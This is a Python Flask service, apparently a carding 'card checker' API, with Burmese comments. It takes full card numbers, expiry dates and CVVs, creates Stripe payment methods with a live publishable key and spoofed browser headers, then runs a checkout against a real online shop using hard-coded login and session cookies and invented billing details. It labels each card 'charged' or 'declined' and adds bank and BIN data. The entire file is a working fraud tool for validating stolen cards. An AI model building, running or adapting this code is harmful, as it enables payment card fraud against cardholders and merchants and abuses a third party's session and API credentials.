import requests
import json
from flask import Flask, request, jsonify
import re
import random
import time

app = Flask(__name__)

def get_bin_info(bin_number):
    """
    BIN number ကနေ card information ရယူဖို့ function
    """
    try:
        response = requests.get(f'https://lookup.binlist.net/{bin_number}', timeout=10)
        if response.status_code == 200:
            return response.json()
        else:
            return {"brand": "Unknown", "type": "Unknown", "country": {"name": "Unknown", "emoji": ""}, "bank": {"name": "Unknown"}}
    except:
        return {"brand": "Unknown", "type": "Unknown", "country": {"name": "Unknown", "emoji": ""}, "bank": {"name": "Unknown"}}

def generate_random_email():
    """Random email တစ်ခုဖန်တီးပေးခြင်း"""
    domains = ['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com']
    names = ['john', 'mike', 'david', 'sarah', 'lisa', 'robert', 'james', 'emily']
    random_name = random.choice(names)
    random_domain = random.choice(domains)
    return f"{random_name}{random.randint(100,999)}@{random_domain}"

def generate_random_name():
    """Random name တစ်ခုဖန်တီးပေးခြင်း"""
    first_names = ['John', 'Mike', 'David', 'Robert', 'James', 'William', 'Richard']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller']
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def full_stripe_check(cc, mm, yy, cvv):
    try:
        # Random email နဲ့ name တွေကိုသုံးမယ်
        random_email = generate_random_email()
        random_name = generate_random_name().replace(' ', '+')
        
        # ပထမ request - Stripe payment method ဖန်တီးခြင်း
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }

        data = f'type=card&billing_details[name]={random_name}&billing_details[address][line1]=New+york&billing_details[address][line2]=Ny&billing_details[address][state]=CA&billing_details[address][city]=Ny&billing_details[address][postal_code]=10080&billing_details[address][country]=US&billing_details[email]={random_email}&billing_details[phone]=9467800446&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=e7aa37ac-16ae-4b63-8429-5494edf9af433484b6&muid=9fdc09ea-719f-4078-a965-30d6a42df364efe2d8&sid=ab77003c-85ad-488b-9952-a494d8dbb98664d042&payment_user_agent=stripe.js%2F0eddba596b%3B+stripe-js-v3%2F0eddba596b%3B+split-card-element&referrer=https%3A%2F%2Fwww.shopbavaros.com&time_on_page=200181&client_attribution_metadata[client_session_id]=69dc6593-b962-4152-a497-aeea8fdaac14&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card_element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51MQy9HINDbycAlvHfBn4GIGDcnpsDsg0zmeWK6q30NCJotdGyMPdf1p046wOzh8cSqwbknLhNrSCShWtFsF3aMdQ00ruyQkeSN'

        response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)

        # Check first response
        if response1.status_code == 200:
            response1_json = response1.json()
            if 'id' in response1_json:
                # First request successful - try second request
                payment_method_id = response1_json['id']
                
                # Second request - Checkout process
                cookies = {
                    'age_gate': '26',
                    '__stripe_mid': '9fdc09ea-719f-4078-a965-30d6a42df364efe2d8',
                    '__stripe_sid': 'ab77003c-85ad-488b-9952-a494d8dbb98664d042',
                    'woolentor_viewed_products_list': 'a%3A3%3A%7Bi%3A1762640427%3Bi%3A1581%3Bi%3A1762640466%3Bi%3A1577%3Bi%3A1762640612%3Bi%3A1580%3B%7D',
                    'woolentor_already_views_count_product': 'a%3A3%3A%7Bi%3A1762640427%3Bi%3A1581%3Bi%3A1762640466%3Bi%3A1577%3Bi%3A1762640612%3Bi%3A1580%3B%7D',
                    'wordpress_logged_in_d878a4c5005a8ec49724db6e3e9ae7ea': 'Tcbn%20fsehj%7C1763850305%7C3u4FsrCLGwpbiCttwIZPkuArjqaXpwFQz5qUgpjLuzd%7Cf98ae3340b6b483721ec4f28c672ffd1c9d1de9812b3442f60ac8dd0c9f1b290',
                    'wp_woocommerce_session_d878a4c5005a8ec49724db6e3e9ae7ea': '155270%7C%7C1762813225%7C%7C1762809625%7C%7C93b1b02528f99ca6bc9bc2e7945d0d0f',
                    'woocommerce_items_in_cart': '1',
                    'woocommerce_cart_hash': '70b9fcb590a9605aabd6f5f6dcf0fad6',
                }

                headers2 = {
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'en-US',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://www.shopbavaros.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.shopbavaros.com/checkout/',
                    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }

                params = {'wc-ajax': 'checkout'}

                data2 = {
                    'billing_first_name': random_name.split('+')[0],
                    'billing_last_name': random_name.split('+')[1] if '+' in random_name else 'Smith',
                    'billing_company': 'GAY',
                    'billing_country': 'US',
                    'billing_address_1': 'New york',
                    'billing_address_2': 'Ny',
                    'billing_city': 'Ny',
                    'billing_state': 'CA',
                    'billing_postcode': '10080',
                    'billing_phone': '9467800446',
                    'billing_email': random_email,
                    'shipping_first_name': '',
                    'shipping_last_name': '',
                    'shipping_company': '',
                    'shipping_country': 'US',
                    'shipping_address_1': '',
                    'shipping_address_2': '',
                    'shipping_city': '',
                    'shipping_state': 'FL',
                    'shipping_postcode': '',
                    'order_comments': '',
                    'shipping_method[0]': 'flat_rate:8',
                    'payment_method': 'stripe',
                    'woocommerce-process-checkout-nonce': '1b5f230e8c',
                    '_wp_http_referer': '/?wc-ajax=update_order_review',
                    'stripe_source': payment_method_id,
                }

                response2 = requests.post('https://www.shopbavaros.com/', params=params, cookies=cookies, headers=headers2, data=data2, timeout=30)

                if response2.status_code == 200:
                    try:
                        response2_json = response2.json()
                        if 'result' in response2_json and response2_json['result'] == 'success':
                            # Payment success - return with return_url
                            return {
                                "status": "✅ charged",
                                "response": "Payment successful",
                                "decline_type": "None",
                                "gate_name": "Stripe Charged",
                                "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                                "author": "※𝙊𝙐𝙏𝘾𝙊𝙈𝟵𝙆～",
                                "return_url": "https://www.shopbavaros.com/checkout/order-received/",
                                "payment_id": payment_method_id
                            }
                        else:
                            return {
                                "status": "❌ declined", 
                                "response": response2_json.get('messages', 'Payment failed'),
                                "decline_type": "Checkout failed",
                                "gate_name": "Stripe Charged",
                                "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                                "author": "※𝙊𝙐𝙏𝘾𝙊𝙈𝟵𝙆～"
                            }
                    except:
                        return {
                            "status": "❌ declined",
                            "response": "Checkout processing error",
                            "decline_type": "Processing error",
                            "gate_name": "Stripe Charged", 
                            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                            "author": "※𝙊𝙐𝙏𝘾𝙊𝙈𝟵𝙆～"
                        }
                else:
                    return {
                        "status": "❌ declined",
                        "response": f"Checkout request failed: {response2.status_code}",
                        "decline_type": "HTTP Error",
                        "gate_name": "Stripe Charged",
                        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                        "author": "※𝙊𝙐𝙏𝘾𝙊𝙈𝟵𝙆～"
                    }
            else:
                return {
                    "status": "❌ declined", 
                    "response": "No payment method ID received",
                    "decline_type": "Payment method creation failed",
                    "gate_name": "Stripe Charged",
                    "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "author": "※𝙊𝙐𝙏𝘾𝙊𝙈𝟵𝙆～"
                }
        else:
            # First request failed - check error
            try:
                error_data = response1.json()
                error_msg = error_data.get('error', {}).get('message', 'Unknown error')
                decline_code = error_data.get('error', {}).get('decline_code', 'Unknown')
                return {
                    "status": "❌ declined",
                    "response": error_msg,
                    "decline_type": decline_code,
                    "gate_name": "Stripe Charged",
                    "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "author": "※𝙊𝙐𝙏𝘾𝙊𝙈𝟵𝙆～"
                }
            except:
                return {
                    "status": "❌ declined",
                    "response": f"HTTP Error: {response1.status_code}",
                    "decline_type": "HTTP Error",
                    "gate_name": "Stripe Charged",
                    "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "author": "※𝙊𝙐𝙏𝘾𝙊𝙈𝟵𝙆～"
                }

    except Exception as e:
        return {
            "status": "❌ error",
            "response": str(e),
            "decline_type": "Exception",
            "gate_name": "Stripe Charged",
            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "author": "※𝙊𝙐𝙏𝘾𝙊𝙈𝟵𝙆～"
        }

@app.route('/stripe_ch', methods=['GET'])
def check_card_endpoint():
    # Get the card details from the URL query parameter `?card=...`
    card_str = request.args.get('card')
    
    if not card_str:
        return jsonify({"error": "Please provide card details using the 'card' parameter in the URL."}), 400

    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str)
    if not match:
        return jsonify({"error": "Invalid card format. Use CC|MM|YY|CVV."}), 400

    cc, mm, yy, cvv = match.groups()
    
    # If year is 2 digits, convert to 4 digits
    if len(yy) == 2:
        yy = '20' + yy
    
    check_result = full_stripe_check(cc, mm, yy, cvv)
    bin_info = get_bin_info(cc[:6])

    final_result = {
        "status": check_result["status"],
        "response": check_result["response"],
        "decline_type": check_result["decline_type"],
        "gate_name": check_result["gate_name"],
        "time": check_result["time"],
        "author": check_result["author"],
        "bin_info": {
            "brand": bin_info.get('brand', 'Unknown'), 
            "type": bin_info.get('type', 'Unknown'),
            "country": bin_info.get('country', {}).get('name', 'Unknown'), 
            "country_flag": bin_info.get('country', {}).get('emoji', ''),
            "bank": bin_info.get('bank', {}).get('name', 'Unknown'),
        }
    }
    
    # Add return_url and payment_id if payment is successful
    if check_result["status"] == "✅ charged":
        final_result["return_url"] = check_result.get("return_url", "")
        final_result["payment_id"] = check_result.get("payment_id", "")
    
    return jsonify(final_result)

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "message": "Stripe Charged Card Checker API is running", 
        "usage": "Use /stripe_ch?card=CC|MM|YY|CVV",
        "author": "※𝙊𝙐𝙏𝘾𝙊𝙈𝟵𝙆～",
        "gate_name": "Stripe Charged"
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
